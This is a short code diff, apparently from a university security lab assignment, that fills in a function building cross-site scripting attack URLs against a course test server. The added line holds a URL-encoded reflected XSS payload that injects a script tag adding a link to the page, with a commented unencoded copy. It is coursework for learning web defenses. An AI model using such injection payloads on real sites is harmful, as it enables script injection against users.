@@ -41,7 +41,8 @@ function makeLink(target, attacker, defense) {
     switch(defense) {
         case 1:
             // TODO: Implement XSS warmup 2.2.3.1
-            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=INSERT%20ATTACK%20HERE";
+            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cscript%3Edocument.body.innerHTML%2B%3D%22%3Cbr%3E%3Ca%20href%3D'http%3A%2F%2Fece.illinois.edu%2F'%3EClick%20me%3C%2Fa%3E%22%3C%2Fscript%3E%3C!--";
+            <!--return  "http://bungle-cs461.csl.illinois.edu/multivac/?name="+encodeURIComponent('<script>document.body.innerHTML+=\"<br><a href=\'http://ece.illinois.edu/\'>Click me</a>\"</script><!--');-->
         case 2:
             // TODO: generate XSS URL for defense level 2.2.3.2 (replace/extend this sample)
             return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
